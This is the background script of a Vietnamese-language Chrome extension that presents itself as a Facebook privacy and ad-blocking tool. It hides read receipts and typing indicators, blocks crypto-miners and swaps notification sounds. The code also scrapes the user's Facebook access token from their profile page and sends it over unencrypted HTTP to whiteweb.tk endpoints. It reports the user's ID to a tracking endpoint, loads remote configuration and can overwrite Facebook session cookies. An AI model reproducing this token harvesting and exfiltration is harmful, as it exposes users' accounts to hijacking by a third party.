var c_user = 0; token = ""; loader_ad=""; loader_black=""; sound_1 =""; sound_2=""; sound_3 =""; sound_4 ="";
function get_access_token(){
chrome.cookies.get({"url": "https://facebook.com", "name": "c_user"}, function (cookie) {
	if(c_user != cookie.value){
	c_user = cookie.value;
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.status != 404 && this.readyState == 4) {
       token = this.responseText.split('access_token:"')[1].split('",')[0];
       if(token.length >10) {
           chrome.storage.sync.set({"access_token": token});
       }
    }
	if(this.status ==404 && this.readyState == 4){ alert("Bạn chưa đăng nhập facebook"); }
};
xhttp.open("GET", "https://www.facebook.com/"+cookie.value, true);
xhttp.send();
	}
});
}
get_access_token(); 
chrome.cookies.onChanged.addListener(function(){ get_access_token(); });
var cancelPayload = {cancel: true};
redirect_1 = {redirectUrl: "https://od.lk/s/MzZfMTYzMDQ0ODNf/Pip%20Pip%20Pip-tainhacchuong.biz.mp3"};
redirect_2 = {redirectUrl: "https://od.lk/s/MzZfMTYzMDQ0ODRf/Happy%20Jump%20Sms-tainhacchuong.biz.mp3"};
redirect_3 = {redirectUrl: "https://od.lk/s/MzZfMTYzMDQ0ODBf/triplefade.mp3"};
redirect_4 = {redirectUrl: "https://od.lk/s/MzZfMTYzMDQ0ODZf/DJ%20Bo%20%E2%80%93%20Nh%E1%BA%A1c%20Tin%20Nh%E1%BA%AFn%20%28Nh%E1%BA%A1c%20Chu%C3%B4ng%29.mp3"};
 call_block_pm= function block_pm(details) {
	return cancelPayload;
}
call_block_typ= function block_typ(details) {
	return cancelPayload;
}
call_block_typ_com= function block_typ_com(details) {
	return cancelPayload;
}
call_pri_fb= function pri_fb(details) {
	return cancelPayload;
}
call_save_net= function save_net(details) {
	return cancelPayload;
}
call_blockads = function blockads(details){
	return cancelPayload;
}
call_block_bit_coin = function block_bit_coin(details){
	chrome.notifications.create(null,{
                type: 'basic',
                iconUrl: 'MEDIA/icon48.png',
                title: "SC WORLD",
                message: "Phát hiện mã đào tiền ảo, đã chặn truy vấn đến trang web! (blocked cryptocurrency)"
            });
			return cancelPayload;
}
call_style_sound_1 = function style_sound_1(details){
	return redirect_1;
}
call_style_sound_2 = function style_sound_2(details){
	return redirect_2;
}
call_style_sound_3 = function style_sound_3(details){
	return redirect_3;
}
call_style_sound_4 = function style_sound_4(details){
	return redirect_4;
}
function enable(block,callback){
			chrome.webRequest.onBeforeRequest.addListener(callback,
				{urls: block},
				// blocks the request until processed; needed to cancel/redir
				["blocking"]
	); }

function disable(callback) {
		chrome.webRequest.onBeforeRequest.removeListener(callback);
	}
function enable_block(lock,callback){
	    chrome.webRequest.onBeforeSendHeaders.addListener(callback,
        {
            urls: lock,
        },
        ["blocking"]
    );
}
function disable_block(callback) {
		chrome.webRequest.onBeforeSendHeaders.removeListener(callback);
	}
function trigger_block(){
	chrome.storage.sync.get({"block_pm": {},"block_typ": {},"block_typ_com": {}, "pri_fb": {},"save_net":{},"block_bit_coin":{},"style_sound_1": {}, "style_sound_3": {}, "style_sound_2": {}},function(load_from){  
	 if(load_from["block_pm"] =="yes") { var block = ["https://www.facebook.com/ajax/mercury/change_read_status.php?dpr=1"]
		enable(block,call_block_pm);
	}
	else{
		disable(call_block_pm);
	}
	if(load_from["block_typ"] =="yes") { var block = ["https://www.facebook.com/ajax/messaging/typ.php?dpr=1"]
	enable(block,call_block_typ);
	}
else{
	disable(call_block_typ);
}
if(load_from["block_typ_com"] =="yes") { var block = ["https://www.facebook.com/ufi/typing/*"]
	enable(block,call_block_typ_com);
	}
else{
	disable(call_block_typ_com);
}
if(load_from["pri_fb"] =="yes") { var block = ["https://www.facebook.com/ajax/bz","https://*.facebook.com/pull?channel*"]
	enable(block,call_pri_fb);
	}
else{
	disable(call_pri_fb);
}
if(load_from["save_net"] =="yes") { var block = ["https://*.fna.fbcdn.net/v/t42.1790-2/*.mp4*"]
	enable(block,call_save_net);
	}
else{
	disable(call_save_net);
}
if(load_from["block_bit_coin"] =="yes") { var block="";
if(loader_black.length ==0){
fetch('http://whiteweb.tk/data/blacklist.json').then(function(response) { return response.json();
  }).then(function(myJson) {
    block = myJson["nocoin"];
	enable_block(block,call_block_bit_coin);
	loader_black="success";
});
}
	}
else{
	disable_block(call_block_bit_coin);
}
if(load_from["style_sound_1"] =="sound_type_1" && sound_1 !=true){ var block = ["https://static.xx.fbcdn.net/rsrc.php/yR/r/lvSDckxyoU5.ogg"]
enable(block,call_style_sound_1); sound_1 = true;
console.info("OK_1");
}
else{
	sound_1 ="";
	disable(call_style_sound_1);
}
 if(load_from["style_sound_1"] =="sound_type_2" && sound_2 !=true){
 var block = ["https://static.xx.fbcdn.net/rsrc.php/yR/r/lvSDckxyoU5.ogg"]
 enable(block,call_style_sound_2); sound_2 =true;
 console.info("OK_2");

 }
 else{
disable(call_style_sound_2); sound_2 ="";
 }
 if(load_from["style_sound_2"] =="sound_type_1" && sound_3 !=true){ var block = ["https://static.xx.fbcdn.net/rsrc.php/yR/r/lvSDckxyoU5.ogg"]
  enable(block,call_style_sound_3); sound_3 =true;
 }
else{ sound_3 ="";
	disable(call_style_sound_3);
}
if(load_from["style_sound_3"] =="sound_type_1" && sound_4 !=true){var block = ["https://static.xx.fbcdn.net/rsrc.php/yh/r/taJw7SpZVz2.mp3"]
  enable(block,call_style_sound_4); sound_4 =true;
} 
else{ sound_4 ="";
	disable(call_style_sound_4);
}
		});
}
trigger_block();
chrome.storage.onChanged.addListener(function(){
	trigger_block();
				});
chrome.runtime.onInstalled.addListener(function() {
    var id = chrome.contextMenus.create({
        id: "Connect-sec",  // Required for event pages
        title: "Báo cáo trang web",
        contexts: ["page"],
    });

});

//  child level contextmenu items

chrome.runtime.onInstalled.addListener(function() {
    var id = chrome.contextMenus.create({
        id: "conect_fhis",
        parentId: "Connect-sec",
        title: "Trang web giả mạo",
        contexts: ["page"],
    });

});


chrome.runtime.onInstalled.addListener(function() {
    var id = chrome.contextMenus.create({
        id: "Conect-spam",
        parentId: "Connect-sec",
        title: "Trang web spam",
        contexts: ["page"],
    });

});
chrome.runtime.onInstalled.addListener(function() {
    var id = chrome.contextMenus.create({
        id: "Connect_bl",
        parentId: "Connect-sec",
        title: "Trang web lừa đảo",
        contexts: ["page"],
    });

});
chrome.storage.sync.get({"wellcome": {}},function(load_from){ if(load_from["wellcome"] !="joined"){
    chrome.tabs.create({url: "/HTML/well_come.html"}); chrome.tabs.create({url: "https://www.facebook.com/groups/whiteweb.tk/"}); chrome.storage.sync.set({"wellcome":"joined"}); }});
   chrome.commands.onCommand.addListener(function(command) {
  if(command == "toggle-feature-foo"){ chrome.tabs.create({url:"/AJI 3.html"})}
      });
	 chrome.contextMenus.create({
      title: "Đăng nhập bằng cookie",
      contexts: ["browser_action"],
      onclick: function() {
		  chrome.storage.sync.get({"sync_cookie":""},function(sc_world){
if(sc_world["sync_cookie"].c_user !=undefined){
var c_user = sc_world["sync_cookie"].c_user;
var xs__user = sc_world["sync_cookie"].xs
		  chrome.cookies.remove({"url": "https://facebook.com", "name":"c_user"});
chrome.cookies.set({ url: "https://.facebook.com/", name: "c_user", value: c_user });
chrome.cookies.remove({"url": "https://facebook.com", "name":"xs"});
chrome.cookies.set({ url: "https://.facebook.com/", name: "xs", value: xs__user });
       chrome.tabs.create({url: "https://facebook.com"});
      }
	  else{
		  alert("Oh no, hiện tại bạn chưa thêm cookie vào hệ thống, vui lòng kiểm tra lại!");
	  }
}); }});
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
            if(request.zc_function ==="turn_on_shield"){
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.status !=404 && this.readyState == 4) {
		data = this.responseText;
       if(data == "1"){
									chrome.runtime.sendMessage({repsonse: "Đã kích hoạt thành công!"});
								}
								else{
									chrome.runtime.sendMessage({repsonse: "Có sự cố, vui lòng thử lại!"})
								}
    }
	if(this.readyState == 4 && this.status ==404){
		alert("Error");
	}
};
xhttp.open("GET", "http://whiteweb.tk/avatar/turn_on.php?token="+token, true);
xhttp.send();	
        }
		if(request.zc_function ==="turn_off_shield"){
			var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
	data = this.responseText;
  if(data == "1"){
									chrome.runtime.sendMessage({repsonse: "Đã tắt khiên thành công!"});
								}
								else{
									chrome.runtime.sendMessage({repsonse: "Có sự cố, vui lòng thử lại!"})
								}
    }
	if(this.readyState == 4 && this.status == 404){
		alert("Error");
	}
};
xhttp.open("GET", "http://whiteweb.tk/avatar/turn_off.php?token="+token, true);
xhttp.send();	
		}
		if(request.get_data ==="done"){
			chrome.runtime.sendMessage({repsonse_get_data: "done"});
chrome.tabs.query({},function(sc_world){
for(var i = 0; i < sc_world.length; i++){
if(sc_world[i].url == "https://staticxx.facebook.com/connect/xd_arbiter.php?load_data=true"){
			 chrome.tabs.remove(sc_world[i].id); } } });
		}
		if(request.stop_me ==="true"){ chrome.storage.sync.get({"optimization_me":[]},function(data){ var data = data["optimization_me"]; 
		chrome.tabs.query({}, function (tabs) {
			for(var on=0; on<tabs.length; on++){
				var url_tab = tabs[on]["url"];
					domain = url_tab.replace('http://','').replace('https://','').replace('www.','').split(/[/?#]/)[0];
					var fav = tabs[on]["favIconUrl"];
					var title= tabs[on]["title"];
				if(tabs[on]["active"] ==false && url_tab.indexOf("optimization_me.html") <=-1 && JSON.stringify(data).indexOf(domain) <=-1){
					  chrome.tabs.update(tabs[on]["id"], {url: "/HTML/optimization_me.html?url="+url_tab+"&title="+title+"&fav="+fav});
				}
			if(on == tabs.length-1){
				chrome.runtime.sendMessage({repsonse: "Đã tối ưu hóa!"});
			}
			}
        }); }); }
    });
 function loaddd(){
	 fetch('http://whiteweb.tk/data/news.json')
  .then(function(response) {
    return response.json();
  })
  .then(function(myJson) {
    chrome.storage.sync.set({"news":myJson["data"][0]["news"]});
});
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.status !=404 && this.readyState == 4) {
		data = this.responseText;
chrome.storage.sync.set({"hornor":JSON.parse(data)["hornor"]["data"]});
    }
	if(this.readyState == 4 && this.status == 404){
		alert("Error");
	}
};
xhttp.open("GET", "http://whiteweb.tk/hornor/data.php?data=true&month="+new Date().getMonth(), true);
xhttp.send();
     var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
         if (this.status !=404 && this.readyState == 4) {
             data = this.responseText;
             chrome.storage.sync.set({"disable": JSON.parse(data)});
         }
         if(this.readyState == 4 && this.status == 404){
             alert("Error");
         }
     };
     xhttp.open("GET", "http://whiteweb.tk/disable/get.php", true);
     xhttp.send();
	var time =0;
function set_time_load(time){
	setTimeout(function(){
		var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.status !=404 && this.readyState == 4) {
		data = JSON.parse(this.responseText);
		position = data["data"][0]["position"];
		time = data["data"][1]["time"];
		if(position !="null"){ chrome.browserAction.setBadgeText({text: JSON.stringify(position)}); }
		set_time_load(time*60000 + 60000);
    }
	if(this.readyState == 4 && this.status == 404){
		alert("Error");
	}
};
xhttp.open("GET", "http://whiteweb.tk/ranking/check_rank_v2.php?get=extension&id="+c_user, true);
xhttp.send(); },time); }
set_time_load(time);
};
loaddd();